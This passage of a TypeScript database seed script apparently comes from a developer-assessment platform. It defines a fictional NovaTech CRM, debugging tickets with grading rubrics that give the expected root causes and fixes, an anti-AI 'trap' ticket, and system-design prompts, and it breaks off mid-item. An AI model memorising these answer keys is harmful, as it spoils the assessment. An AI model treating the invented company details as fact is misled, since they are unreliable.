import { PrismaClient, Stack, Difficulty, OrgRole, CampaignStatus } from "@prisma/client";

const prisma = new PrismaClient();

export async function runSeed(): Promise<void> {
  console.log("[seed] Seeding database...");

  // Ensure enum values added after initial migration exist in the DB.
  // ALTER TYPE ADD VALUE cannot run inside a transaction, so we use
  // $executeRawUnsafe in autocommit mode before any upserts.
  await prisma.$executeRawUnsafe(`ALTER TYPE "Stack" ADD VALUE IF NOT EXISTS 'DEVOPS'`);
  await prisma.$executeRawUnsafe(`ALTER TYPE "Stack" ADD VALUE IF NOT EXISTS 'CPP'`);
  await prisma.$executeRawUnsafe(`ALTER TYPE "Stack" ADD VALUE IF NOT EXISTS 'JAVA'`);

  const codebase = await prisma.codebase.upsert({
    where: { id: "novatech-crm-seed-id-001" },
    update: {},
    create: {
      id: "novatech-crm-seed-id-001",
      name: "NovaTech CRM",
      stack: Stack.DOTNET,
      repoUrl: "https://github.com/DevSimulate/novatech-crm",
      description: "A mid-market CRM system serving 2,000+ enterprise clients. Built in .NET 6 with a SQL Server backend and Angular frontend.",
      companyLore: `NovaTech Solutions was founded in 2014 by two ex-Salesforce engineers who believed the SMB market was underserved by bloated enterprise CRM tools.

The CRM started as a clean .NET monolith and has grown to ~180,000 lines of code across 6 major modules: Sales, Orders, Customer Management, Reporting, Discounting, and Notifications.

The engineering team is 14 developers across 3 squads. Technical debt has accumulated across the Order and Discount modules following a rushed migration from SQL Server 2012 to 2019 last quarter. The original architects left the company in 2022. Documentation is sparse.

Key facts engineers must know:
- Orders over $500 go through a secondary fraud check via an external API (FraudShield)
- Discount rules cascade in a specific priority order: Contract > Promotional > Volume > Default
- The notification system uses a fire-and-forget pattern that does not retry on failure
- Customer dashboard data is denormalized into a reporting cache that was rebuilt during the SQL migration`,
    },
  });

  const tickets = [
    {
      id: "ticket-nova-47-seed-id-001",
      title: "NOVA-47: Intermittent Order Fulfillment Failure",
      description: "Customers are reporting that their orders sometimes get confirmed but never actually get fulfilled. It happens roughly 1 in 50 orders. The CEO was affected yesterday. We cannot reproduce it consistently. No exceptions appear in the logs. Only seems to affect orders over $500. Figure out what is going wrong and fix it properly.",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/Services/OrderService.cs", "src/Services/NotificationService.cs", "src/Repositories/OrderRepository.cs"],
      rubric: { diagnosis: "Did the developer identify the FraudShield integration as the root cause? Did they notice the fire-and-forget notification pattern masks the failure? Did they find the missing await/async bug or timeout misconfiguration causing silent drops for orders >$500?", design: "Did they propose proper error handling with retry logic? Did they consider idempotency? Did they add dead-letter queue or alerting rather than just catching exceptions?", communication: "Did they clearly explain root cause vs symptom? Did they document the FraudShield integration behaviour and its failure modes?", execution: "Does their fix actually prevent the silent failure? Does it handle the race condition or timeout correctly?" },
      expectedMinutes: 90,
    },
    {
      id: "ticket-nova-52-seed-id-002",
      title: "NOVA-52: Dashboard Performance Degradation",
      description: "The main customer dashboard loads in under 2 seconds for new customers. For customers with more than 18 months of history it takes between 40 and 60 seconds. Product wants it under 2 seconds for everyone. This started after the data migration last quarter.",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/Controllers/DashboardController.cs", "src/Repositories/CustomerRepository.cs", "src/Services/ReportingService.cs"],
      rubric: { diagnosis: "Did they identify the N+1 query in CustomerRepository introduced during the SQL migration? Did they find that the reporting cache is not being populated correctly for customers created before the migration date?", design: "Did they choose an appropriate fix — e.g. fixing the cache rebuild, adding a composite index, or rewriting the query to use a single JOIN? Did they consider migration-safe rollout?", communication: "Did they clearly explain why new customers are fast but legacy customers are slow? Did they link the issue to the SQL migration?", execution: "Does their solution actually bring load time under 2 seconds for legacy customers? Did they add a query explain plan or benchmark?" },
      expectedMinutes: 75,
    },
    {
      id: "ticket-nova-58-seed-id-003",
      title: "NOVA-58: Discount Calculation Conflict",
      description: "Finance and Sales are in a meeting room arguing. Finance says the discount engine is calculating wrong totals. Sales says the numbers are correct and Finance does not understand the business rules. Both have spreadsheets. You need to read the code, understand the actual business rules, determine who is right, document what the rules actually are, and fix any discrepancy you find.",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/Services/DiscountEngine.cs", "src/Models/DiscountRule.cs", "docs/business-rules.md"],
      rubric: { diagnosis: "Did they correctly read the code and identify that the cascade priority order (Contract > Promotional > Volume > Default) is not being enforced? Did they determine that Finance is correct — the engine is applying discounts additively instead of using the highest-priority rule only?", design: "Did they fix the cascade logic correctly? Did they write the updated business rules documentation? Did they consider backwards compatibility for existing contracts?", communication: "Did they clearly adjudicate between Finance and Sales with evidence from the code? Did they write clear documentation that both teams could understand? Did they explain the impact of the bug?", execution: "Does the fixed engine pass the Finance team's test cases? Does it maintain the correct cascade priority?" },
      expectedMinutes: 120,
    },
    {
      id: "ticket-nova-61-seed-id-004",
      title: "NOVA-61: Inventory Over-Commitment Under Load",
      description: "During last week's flash sale, 340 units of SKU-8821 were sold but we only had 200 in stock. Fulfilment is furious. Orders are going out with a backorder status that customers were never told about. It only seems to happen when traffic spikes. Normal single-user testing works fine. Find the root cause and fix it so we can't sell stock we don't have.",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/NovaTechCRM.Services/InventoryService.cs", "src/NovaTechCRM.Repositories/InventoryRepository.cs", "src/NovaTechCRM.Domain/Models/Inventory.cs"],
      rubric: { diagnosis: "Did the developer identify the read-check-write race condition in ReserveAsync? Did they understand that two concurrent requests both read QuantityAvailable before either writes, allowing both to pass the stock check against the same stale snapshot?", design: "Did they choose a correct fix — optimistic concurrency (RowVersion/ETag), a database-level atomic update, pessimistic locking, or a serialised reservation queue? Did they consider the trade-offs of each approach for a high-throughput sale scenario?", communication: "Did they explain why the bug is invisible in single-user testing but surfaces under concurrent load? Did they describe the race window clearly in the PR?", execution: "Does the fix actually prevent over-commitment? Is the solution deadlock-safe? Does it handle the retry/conflict path correctly?" },
      expectedMinutes: 90,
    },
    {
      id: "ticket-nova-74-seed-id-005",
      title: "NOVA-74: API Memory Usage Grows Over Time",
      description: "Ops is restarting the API every 48 hours because memory climbs from ~300 MB at startup to over 2 GB. It never comes back down. A heap dump shows thousands of ReportService instances still reachable even though the requests that created them finished long ago. The service is registered as Scoped in DI so each request should get a fresh instance — yet they are not being collected. Find out why and fix it.",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/NovaTechCRM.Services/ReportService.cs", "src/NovaTechCRM.Api/Program.cs"],
      rubric: { diagnosis: "Did the developer find the static event handler list or static dictionary in ReportService that accumulates a reference to every instance ever constructed? Did they understand that static fields in a Scoped service pin instances in memory permanently, defeating GC?", design: "Did they propose the correct fix — removing the static state, using weak references, or moving the shared state to a Singleton service? Did they consider thread safety of any replacement?", communication: "Did they clearly explain why Scoped lifetime does not protect against static field leaks? Did they quantify the growth rate and connect it to request volume?", execution: "Does the fix eliminate the static reference? Does memory stabilise after the fix is applied under load?" },
      expectedMinutes: 75,
    },
    {
      id: "ticket-nova-83-seed-id-006",
      title: "NOVA-83: Payment Method Details Exposed to Wrong Users",
      description: "A customer emailed us saying they could see another customer's saved card details in the mobile app. Our security team has confirmed it is reproducible. Any authenticated user can retrieve the full card metadata for any payment method in the system just by knowing — or guessing — the payment method ID. The IDs are UUIDs so guessing is hard, but the exposure is real and we need it fixed before legal finds out.",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/NovaTechCRM.Api/Controllers/PaymentsController.cs", "src/NovaTechCRM.Services/PaymentService.cs"],
      rubric: { diagnosis: "Did the developer identify the missing ownership check on GET /api/payments/methods/{id}/details? Did they see that the endpoint fetches all payment methods across all customers and returns whichever matches the ID, with no check that the authenticated user owns it?", design: "Did they add the correct ownership check — verifying the payment method's CustomerId matches the authenticated user's customer ID before returning it? Did they consider whether the service layer or controller layer is the right place for this check?", communication: "Did they classify this as an IDOR (Insecure Direct Object Reference) vulnerability? Did they assess the impact — full card metadata exposure for all customers?", execution: "Does the fix correctly prevent cross-customer access? Does it return 403 (not 404) for unauthorised access to another user's payment method?" },
      expectedMinutes: 45,
    },
    {
      id: "ticket-nova-91-seed-id-007",
      title: "NOVA-91: Shipment Report Shows Wrong Date Range in Some Regions",
      description: "Customers in the UAE and Singapore are complaining that the 'last 30 days' shipment report is missing shipments from the most recent day and including shipments from 31 days ago. UK and EU customers report it correctly. It works fine on the developer machines in the Dublin office. We deploy to servers in UTC+0 and the bug only appears for tenants in UTC+4 and UTC+8 timezones. Find it and fix it.",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/NovaTechCRM.Services/ShipmentService.cs", "src/NovaTechCRM.Domain/ValueObjects/DateRange.cs"],
      rubric: { diagnosis: "Did the developer find that DateRange.LastNDays uses DateTime.Now (local server time) instead of DateTime.UtcNow? Did they understand that on UTC+0 servers the bug is invisible but shifts the window by the tenant's UTC offset in other regions?", design: "Did they fix it by replacing DateTime.Now with DateTime.UtcNow throughout the date range calculation? Did they consider whether tenant timezone conversion is needed at the display layer vs the query layer?", communication: "Did they explain why the bug is invisible on UTC servers? Did they link the symptom (wrong day boundary) to the root cause (local time vs UTC)?", execution: "Does the fix use UTC consistently? Does it pass a test that runs in a non-UTC timezone without drift?" },
      expectedMinutes: 30,
    },
    {
      id: "ticket-nova-96-seed-id-008",
      title: "NOVA-96: Invoice Emails Sent Without PDF Attachment",
      description: "Customers are complaining they receive invoice emails with no PDF attached. Support has confirmed it reproducibly: the email arrives, the body is correct, but there is no PDF link and no downloadable document. The code team says 'PDF generation works fine' because when they test GeneratePdfAsync directly it produces a URL. The bug only appears when invoices are sent via the automated flow. Find where the PDF URL is being dropped and fix it.",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/NovaTechCRM.Services/InvoiceService.cs"],
      rubric: { diagnosis: "Did the developer find that SendAsync calls GeneratePdfAsync but ignores its return value, leaving the local invoice object with a null PdfUrl? Did they trace the call: GeneratePdfAsync saves the URL to DB but the in-memory invoice is never updated, so SendInvoiceAsync receives an invoice with PdfUrl = null?", design: "Did they fix it by capturing the return value of GeneratePdfAsync and updating invoice.PdfUrl before calling SendInvoiceAsync? Did they consider that re-fetching the invoice from DB after GeneratePdfAsync is an alternative correct fix?", communication: "Did they clearly explain that the PDF is generated successfully but the in-memory object is stale? Did they distinguish between the DB state (correct) and the object passed to the notification (wrong)?", execution: "Does the fix ensure invoice.PdfUrl is non-null before calling SendInvoiceAsync? Does the generated PDF URL reach the email?" },
      expectedMinutes: 40,
    },
    {
      id: "ticket-nova-99-seed-id-009",
      title: "NOVA-99: Soft-Deleted Customers Appear in Search and Order Assignment",
      description: "Sales reps are complaining that closed customer accounts keep appearing when they search for customers to assign an order to. We closed 47 accounts last month after failed debt collection. Those accounts should be invisible to the UI. They still show up in search results and in the 'assign order' dropdown. The DeleteAsync method does soft-delete them (status = Closed) but something is not filtering them out downstream.",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/NovaTechCRM.Services/CustomerService.cs", "src/NovaTechCRM.Repositories/CustomerRepository.cs"],
      rubric: { diagnosis: "Did the developer identify that CustomerService.SearchAsync and GetAllAsync pass no status filter to the repository? Did they find that the repository queries do not exclude Status = Closed records?", design: "Did they add a status filter — either at the service layer (filtering the returned list) or at the repository layer (adding a WHERE Status != Closed clause)? Did they consider that adding the filter at the repository layer is more efficient as it avoids loading closed records from the DB at all?", communication: "Did they explain the soft-delete pattern and why the filter needs to be explicit? Did they note that EvaluateTierAsync and GetAllDashboardsAsync may have the same issue?", execution: "Does the fix prevent Closed customers from appearing in search results? Does GetAllAsync also exclude them?" },
      expectedMinutes: 35,
    },
    {
      id: "ticket-nova-102-seed-id-010",
      title: "NOVA-102: Duplicate Invoice Numbers Generated Under Load",
      description: "Finance has flagged 11 invoices this quarter with duplicate numbers — two separate invoices both assigned INV-2026-00034, for example. They only discovered it when a customer called about a payment that was applied to the wrong account. The invoice sequence supposedly comes from the database but somehow two invoices are getting the same number. It never happens during normal usage but appears under traffic spikes.",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/NovaTechCRM.Services/InvoiceService.cs", "src/NovaTechCRM.Repositories/InvoiceRepository.cs"],
      rubric: { diagnosis: "Did the developer identify that GetNextSequenceAsync likely uses a non-atomic read-then-increment pattern (SELECT MAX(sequence) + 1) rather than a database sequence or atomic increment? Under concurrent load two transactions can both read the same MAX value before either commits, resulting in duplicate sequence numbers.", design: "Did they propose replacing the read-increment pattern with a proper database sequence (CREATE SEQUENCE) or an atomic UPDATE ... OUTPUT / RETURNING clause? Did they consider a Redis counter as an alternative? Did they note the static _invoiceSequence field is also a cross-instance risk?", communication: "Did they explain why the race condition is invisible in single-request testing but surfaces under concurrent load? Did they assess the financial impact of duplicate invoice numbers?", execution: "Does the proposed fix guarantee uniqueness under concurrent requests across multiple API instances? Is it deadlock-safe?" },
      expectedMinutes: 75,
    },
    {
      // TRAP TICKET: the obvious AI fix (parallelise harder / add a lock / raise the
      // timeout) is the BUG. The intern's Parallel.ForEach shares one EF DbContext,
      // which is not thread-safe — that causes both the exception and the corruption.
      // A driver catches it; a conduit relaying AI ships the bug.
      id: "ticket-nova-130-seed-id-trap",
      title: "NOVA-130: Monthly Billing Run Times Out",
      description: "Our monthly billing job loops over every active customer and runs a few queries each to assemble their invoice. It's gotten slow and now times out before finishing. An intern already opened a draft PR that speeds it up by wrapping the per-customer work in Parallel.ForEach so customers are processed concurrently — it runs much faster on his laptop. But since it went to staging we're seeing intermittent 'A second operation was started on this context instance before a previous operation completed' errors, and a handful of customers got invoices with the wrong line items. Make the billing run finish in time WITHOUT these errors or data corruption. Review the intern's approach before building on it.",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/NovaTechCRM.Services/BillingService.cs", "src/NovaTechCRM.Infrastructure/BackgroundJobs/MonthlyBillingJob.cs", "src/NovaTechCRM.Api/Program.cs"],
      rubric: { diagnosis: "THE TRAP: the real root cause is that the intern's Parallel.ForEach shares a single injected NovaTechDbContext across concurrent operations — and EF Core's DbContext is NOT thread-safe. That is the source of BOTH the 'second operation started on this context' exception AND the wrong-line-item corruption (interleaved tracked entities). Full marks require identifying that the parallelism over a shared context is itself the bug — not merely that the job is slow. PENALIZE HEAVILY any answer that treats this as a pure performance problem and proposes 'parallelise more', 'add a lock around the context', 'increase the timeout', 'retry on failure', or 'scale the DB' — those are the confident-but-wrong fixes an AI suggests from the ticket framing.", design: "Did they choose a CORRECT fix and justify it? Acceptable: (a) make it set-based — replace the per-customer N+1 with one batched query so concurrency isn't needed (best), or (b) keep bounded parallelism but give each unit of work its OWN context via IDbContextFactory.CreateDbContext plus a throttle. Reward 'I chose X over Y because Z, at the cost of W' and the insight that locking the shared context just serialises everything while still risking change-tracker corruption.", communication: "VERIFICATION: can they explain HOW they know the corruption is gone, not just that it's faster? Reward stating the DbContext thread-safety rule explicitly, explaining why it 'worked on the intern's laptop' (low concurrency) but fails under load, and describing how they'd verify (run billing concurrently and assert line items match a single-threaded baseline).", execution: "Does the fix remove BOTH symptoms — the concurrency exception and the wrong-line-item corruption — while finishing in time? A fix that only silences the exception (try/catch or a lock) but leaves the data-correctness risk does NOT pass." },
      expectedMinutes: 120,
    },
    {
      id: "ticket-nova-105-seed-id-011",
      title: "NOVA-105: Customer Tier Not Recalculated After Large Refunds",
      description: "The sales team noticed 9 enterprise customers have Gold or Platinum tier badges but should have been downgraded months ago. Each of these customers had large refunds processed — one customer spent $22,000 (Platinum) but was refunded $19,000, leaving effective lifetime spend of $3,000 (Silver). They are still Platinum and receiving Platinum-tier discounts worth thousands of dollars. Figure out why tier evaluation is not accounting for refunds.",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/NovaTechCRM.Services/CustomerService.cs", "src/NovaTechCRM.Services/PaymentService.cs"],
      rubric: { diagnosis: "Did the developer find that EvaluateTierAsync calculates lifetime value using only fulfilled orders (Sum of TotalAmount) with no deduction for refunds? Did they identify that refunds in PaymentService update the Payment record but do not adjust order totals or trigger a tier re-evaluation?", design: "Did they propose either (a) deducting refunded amounts from LTV in EvaluateTierAsync, or (b) triggering EvaluateTierAsync after a refund is processed in RefundAsync? Did they consider backwards compatibility — running a one-time backfill to fix existing incorrect tiers?", communication: "Did they explain why the bug is hard to notice — tiers only get re-evaluated explicitly, and refunds flow through a different code path? Did they quantify the business impact (incorrect discounts)?", execution: "Does the fix correctly reduce LTV by refunded amounts when evaluating tier? Does a $22,000 spend with $19,000 in refunds correctly resolve to Silver tier ($3,000)?" },
      expectedMinutes: 60,
    },
    {
      id: "ticket-nova-108-seed-id-012",
      title: "NOVA-108: Overdue Invoice Notification Has No Grace Period",
      description: "We are getting angry emails from enterprise customers. They receive an aggressive 'Your invoice is OVERDUE' notification on the exact day the invoice is due — sometimes within hours of the due date — before they have had a chance to pay. Two accounts threatened to cancel. The contract says we must allow 3 business days before sending overdue notices. The code sends them at midnight on the due date. Find it and add the grace period.",
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/NovaTechCRM.Services/InvoiceService.cs", "src/NovaTechCRM.Infrastructure/BackgroundJobs/InvoiceOverdueJob.cs"],
      rubric: { diagnosis: "Did the developer find ProcessOverdueAsync uses `i.DueAt < now` with no grace period, so the very first midnight after the due date triggers the overdue notification? Did they find the TODO comment referencing NOVA-64 that explicitly called this out?", design: "Did they change the condition to `i.DueAt.AddDays(3) < now` or introduce a configurable GracePeriodDays setting? Did they consider that 'business days' vs 'calendar days' may matter for enterprise contracts and suggest making it configurable?", communication: "Did they explain the customer impact clearly and reference the contract SLA? Did they suggest whether the grace period should be configurable per customer tier or global?", execution: "Does the fix prevent notifications from firing within 3 days of the due date? Does it correctly handle invoices that were already past the grace period before the fix is deployed?" },
      expectedMinutes: 45,
    },
    {
      id: "ticket-nova-111-seed-id-013",
      title: "NOVA-111: Any Authenticated User Can Delete Another Customer's Payment Method",
      description: "Our security team ran an internal penetration test and found that DELETE /api/payments/methods/{id} deletes the payment method with no check that the authenticated user actually owns it. An attacker who knows (or guesses) a payment method UUID can delete any customer's saved card. We already fixed a similar read vulnerability in NOVA-83. This is the same class of bug on the delete endpoint. Fix it before the pen test report goes to the board.",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/NovaTechCRM.Services/PaymentService.cs", "src/NovaTechCRM.Api/Controllers/PaymentsController.cs", "src/NovaTechCRM.Repositories/IPaymentRepository.cs"],
      rubric: { diagnosis: "Did the developer identify that DeletePaymentMethodAsync in PaymentService calls the repository with no ownership verification? Did they confirm the controller passes the ID directly without checking the authenticated user's customerId against the payment method's customerId?", design: "Did they add a lookup before delete — fetch the payment method, verify PaymentMethod.CustomerId == authenticated user's customerId, return 403 if mismatch? Did they discuss whether the check belongs in the service layer (preferred) or controller layer?", communication: "Did they classify this as an IDOR (Insecure Direct Object Reference) vulnerability? Did they reference NOVA-83 as a prior instance of the same pattern in the codebase and suggest an audit of other endpoints?", execution: "Does the fix return 403 (not 404) when attempting to delete another customer's payment method? Is the fix placed at the service layer so it cannot be bypassed by different controller routes?" },
      expectedMinutes: 50,
    },
    {
      id: "ticket-nova-114-seed-id-014",
      title: "NOVA-114: Audit Logs Missing for Entire Production System",
      description: "Compliance ran a quarterly audit review and found zero audit entries in the database for the last 90 days — despite the system processing thousands of orders. The AuditFlushJob logs show it running successfully every 30 seconds and always reporting 0 entries flushed. The development team insists the AuditService.LogAsync is being called correctly on every create/update/delete. Somehow entries are going in but never coming out. Find out why and fix it.",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/NovaTechCRM.Services/AuditService.cs", "src/NovaTechCRM.Infrastructure/BackgroundJobs/AuditFlushJob.cs"],
      rubric: { diagnosis: "Did the developer discover that AuditService is registered as Scoped in DI? Each HTTP request creates its own AuditService instance with its own _batch list. The AuditFlushJob creates a new DI scope and gets a fresh AuditService with an empty batch — it never sees the entries accumulated in request-scoped instances. Request scopes are disposed at end-of-request, taking the unflushed batch with them.", design: "Did they propose the correct fix — registering AuditService as Singleton so the same _batch is shared across all requests and the flush job? Did they address thread safety — the existing SemaphoreSlim _lock is already present and handles this correctly for Singleton lifetime. Did they suggest running a compensating migration or re-audit for the missing 90 days?", communication: "Did they clearly explain the DI lifetime mismatch? Did they explain why the flush job always reports 0 — it is genuinely seeing an empty batch, not a logging bug? Did they connect the Scoped vs Singleton lifetime to the symptom?", execution: "Does changing to Singleton registration cause the flush job to see and flush the accumulated entries? Is the SemaphoreSlim thread-safe under Singleton usage across concurrent requests?" },
      expectedMinutes: 90,
    },
    {
      id: "ticket-nova-117-seed-id-015",
      title: "NOVA-117: Customers Charged Twice After Payment Timeout",
      description: "Three enterprise customers have contacted us saying they were double-charged. In each case the story is the same: they submitted payment, it appeared to hang or time out, they hit submit again, and two charges appeared on their statement. Our logs show two separate payment records for each case, both with status Succeeded. The payment provider (Stripe) confirms both charges as legitimate transactions. We created the payment twice. Find the root cause and implement the fix.",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/NovaTechCRM.Services/PaymentService.cs", "src/NovaTechCRM.Infrastructure/Payments/StripePaymentProvider.cs"],
      rubric: { diagnosis: "Did the developer find that ChargeAsync creates a payment record in the DB before calling the provider, but if the DB update (step 3) fails or times out, the payment is stuck in Processing status? On retry, a new payment record is created and the provider is called again — the customer is charged twice. Did they identify the lack of an idempotency key as the root cause?", design: "Did they propose using a deterministic idempotency key (e.g., derived from customerId + invoiceId + amount + date) passed to the provider on every charge attempt? Did they consider using the existing Payment.Id GUID as the idempotency key since it is created before the provider call? Did they consider checking for existing Processing payments for the same invoice before creating a new record?", communication: "Did they explain the exact failure sequence — provider succeeds, DB update fails, payment stuck in Processing, retry creates second charge? Did they distinguish user-triggered retry from automated retry? Did they assess liability/refund process for the affected customers?", execution: "Does the fix prevent a second charge when the same invoice payment is retried? Does it handle the case where the provider has the charge but the DB does not, and reconcile correctly?" },
      expectedMinutes: 120,
    },
    {
      id: "ticket-nova-120-seed-id-016",
      title: "NOVA-120: Race Condition in Set-Default Payment Method",
      description: "Customer support has escalated a recurring complaint: customers update their default payment method in the app and the next subscription renewal charges the old card instead. When we look in the DB we sometimes find two payment methods both marked IsDefault = true for the same customer. This causes the charge to go to whichever record the payment service happens to load first. It seems to happen when the customer saves a new card on the mobile app and web app at the same time.",
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/NovaTechCRM.Services/PaymentService.cs", "src/NovaTechCRM.Repositories/IPaymentRepository.cs"],
      rubric: { diagnosis: "Did the developer identify the read-modify-write race condition in SavePaymentMethodAsync? Two concurrent requests both read the existing payment methods, both see the old method as default, both clear it and set their own new method as default. The second write does not undo the first — both end up with IsDefault = true.", design: "Did they propose an atomic fix — either a database-level UPDATE ... SET IsDefault = false WHERE CustomerId = @id (all at once before inserting the new default), or a pessimistic lock (SELECT FOR UPDATE), or an optimistic concurrency check? Did they rule out the current approach of loading-and-updating individual records as inherently racy?", communication: "Did they explain why this is invisible in single-user testing but surfaces under concurrent mobile+web sessions? Did they describe the customer impact (wrong card charged on renewal)?", execution: "Does the fix ensure exactly one payment method per customer is marked IsDefault at all times, even under concurrent requests? Is the fix deadlock-safe?" },
      expectedMinutes: 90,
    },
    {
      id: "ticket-nova-123-seed-id-017",
      title: "NOVA-123: Overdue Invoice Notification Silently Lost on Process Restart",
      description: "Finance discovered 34 invoices that are marked Overdue in the database but the customers never received an overdue notification. These are real past-due balances that customers are unaware of. The pattern: every case corresponds to a deployment window — the API was restarted between midnight and 1 AM when the overdue job runs. Find out exactly how the notification gets lost and propose a fix that guarantees either the notification is sent or the invoice stays Issued so the job retries it tomorrow.",
      difficulty: Difficulty.MID,
      filesInvolved: ["src/NovaTechCRM.Services/InvoiceService.cs", "src/NovaTechCRM.Infrastructure/BackgroundJobs/InvoiceOverdueJob.cs"],
      rubric: { diagnosis: "Did the developer find that ProcessOverdueAsync updates the invoice status to Overdue in the DB BEFORE sending the notification? If the process is killed after the DB update but before SendInvoiceOverdueAsync completes, the invoice is permanently Overdue in the DB but no notification was sent. The job only queries Issued invoices so it will never retry.", design: "Did they propose reordering operations — send the notification first, then update status — so that a crash before the DB update leaves the invoice as Issued and the job retries tomorrow? Did they discuss the trade-off: reordering means a crash after notification but before DB update sends a duplicate notification. Did they suggest an outbox pattern or idempotency field as the robust solution?", communication: "Did they clearly explain the at-most-once vs at-least-once delivery trade-off? Did they link the failure to deployment restarts during the job window? Did they recommend a monitoring alert for the gap between Overdue invoices and notification send logs?", execution: "Does the proposed fix eliminate silent notification loss in the common deployment-restart scenario? If reordering is chosen, is the duplicate-notification risk correctly acknowledged and mitigated?" },
      expectedMinutes: 75,
    },
  ];

  for (const t of tickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.DOTNET, codebaseId: codebase.id },
    });
  }

  // ── System Design Arena codebase ──────────────────────────────────────────
  const sdCodebase = await prisma.codebase.upsert({
    where: { id: "system-design-arena-seed-id-001" },
    update: {},
    create: {
      id: "system-design-arena-seed-id-001",
      name: "System Design Arena",
      stack: Stack.SYSTEM_DESIGN,
      repoUrl: "https://devsimulate.com",
      description: "Open-ended architecture challenges modelled on FAANG system design interviews. No codebase — design from scratch.",
      companyLore: `System Design Arena presents candidates with real-world architecture problems similar to those asked at Google, Meta, Amazon, Apple, Netflix, and other top-tier engineering companies.

There is no existing codebase. The candidate must design a system from scratch: define requirements, estimate scale, propose an architecture, describe data models, explain API design, and discuss trade-offs.

Evaluation criteria match FAANG interview expectations:
- Requirements & Scope (40 pts): Did you identify functional requirements, non-functional requirements, and constraints? Did you clarify scale — QPS, storage, latency targets?
- Architecture Quality (30 pts): Is your design sound, scalable, and appropriately complex for the stated scale? Does it avoid single points of failure and choose appropriate data stores?
- Communication & Trade-offs (20 pts): Did you explain WHY you chose each component? Did you consider alternatives and justify your decisions? Is the design walkthrough clear and structured?
- Completeness (10 pts): Did you cover all required components at sufficient depth? Did you address failure modes and data consistency?`,
    },
  });

  const sdTickets = [
    {
      id: "ticket-sd-01-seed-id-001",
      title: "SD-01: Design a URL Shortener",
      description: `Design a URL shortening service similar to bit.ly or tinyurl.com.

**Scale requirements:**
- 100 million new URLs created per day (~1,200 writes/sec)
- Read-to-write ratio of 100:1 (~120,000 redirects/sec)
- Redirect latency must be under 10ms at p99
- URLs should be valid for at least 5 years

**Your answer must cover:**
1. API design — create URL endpoint, redirect endpoint, optional custom alias
2. How you generate the short code — hash, counter, or base62 encoding? Handle collisions.
3. Data model and storage choice — what do you store, where, and why?
4. How you achieve <10ms redirects at 120k/sec — caching strategy, cache invalidation
5. At least one trade-off in your design — be explicit about what you chose and why

Write your complete system design below. Be specific: name the technologies, describe the data flow, and justify your choices.`,
      difficulty: Difficulty.MID,
      filesInvolved: ["api-design", "data-model", "hashing-strategy", "caching-layer"],
      rubric: {
        diagnosis: "Did they correctly identify the key constraint — 100:1 read/write ratio — and understand its implications for caching? Did they note uniqueness requirements for short codes and the need for collision handling?",
        design: "Is the core design sound? Does the hash/counter approach handle collisions correctly? Is the caching layer (Redis/CDN) appropriate for the read-heavy workload? Is the storage choice reasonable (KV store or relational with index)?",
        communication: "Did they explain WHY they chose each component? Did they discuss at least one trade-off explicitly (e.g. hash vs counter, Redis vs CDN caching, SQL vs NoSQL)?",
        execution: "Did they cover all 5 required components? Is the redirect flow clearly described end-to-end? Are the API endpoints defined with HTTP methods and response codes?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-sd-02-seed-id-002",
      title: "SD-02: Design a Rate Limiter",
      description: `Design a distributed rate limiter that can be used as middleware in a large API gateway.

**Requirements:**
- Limit requests per user per time window (e.g. 1,000 req/min per API key)
- Must work correctly across 50 horizontally-scaled API gateway instances
- Adding a new rule (new API key + limit) must take effect within 30 seconds across all instances
- p99 latency overhead of the rate limiter itself must be under 2ms

**Your answer must cover:**
1. Which rate limiting algorithm you choose (token bucket, leaky bucket, fixed window, sliding window log, sliding window counter) and why
2. How you store and synchronise state across 50 gateway instances
3. How you handle the race condition when two gateway instances check the same counter simultaneously
4. What happens when your rate limiter's storage layer goes down — fail open or fail closed? Why?
5. How you propagate rule changes within 30 seconds across all instances

Write your complete design below. Be specific about data structures, storage choices, and the trade-offs of your approach.`,
      difficulty: Difficulty.MID,
      filesInvolved: ["algorithm-choice", "distributed-state", "storage-layer", "failure-modes"],
      rubric: {
        diagnosis: "Did they identify the core challenge — distributed state synchronisation across 50 instances — and the race condition in the check-then-decrement pattern? Did they clarify the exact requirements (per-user, per-window, latency budget)?",
        design: "Did they choose an appropriate algorithm (sliding window counter or token bucket preferred at this scale) and justify it? Did they address the distributed state problem with Redis + Lua scripts or similar atomic operations? Did they design for the 2ms latency constraint?",
        communication: "Did they explicitly discuss the fail-open vs fail-closed trade-off? Did they compare at least two algorithm options before choosing? Did they explain their rule propagation strategy (pub/sub, polling, config push)?",
        execution: "Did they address all 5 required components? Is the atomic increment mechanism described correctly? Is the rule propagation mechanism concrete and achievable within 30 seconds?",
      },
      expectedMinutes: 45,
    },
    {
      id: "ticket-sd-03-seed-id-003",
      title: "SD-03: Design a Push Notification Service",
      description: `Design a push notification service that sends real-time notifications to mobile devices and browser clients.

**Scale requirements:**
- 10 million registered devices (mix of iOS, Android, web browser)
- Send 5 million notifications per day (~58/sec average, up to 10,000/sec during campaigns)
- Delivery guarantee: at-least-once (duplicates are acceptable, losses are not)
- Delivery latency: notifications should arrive within 5 seconds of being triggered

**Your answer must cover:**
1. System architecture — what are the main components and how do they communicate?
2. How you handle fan-out for a notification sent to 1 million users simultaneously (e.g. a marketing campaign)
3. How you integrate with APNs (Apple), FCM (Google), and web push — what does the abstraction look like?
4. How you ensure at-least-once delivery — what happens when a device is offline?
5. How you track delivery status and handle failures (device token expired, app uninstalled)

Write your complete design below. Be specific about queue design, retry logic, and the data model for device registrations.`,
      difficulty: Difficulty.MID,
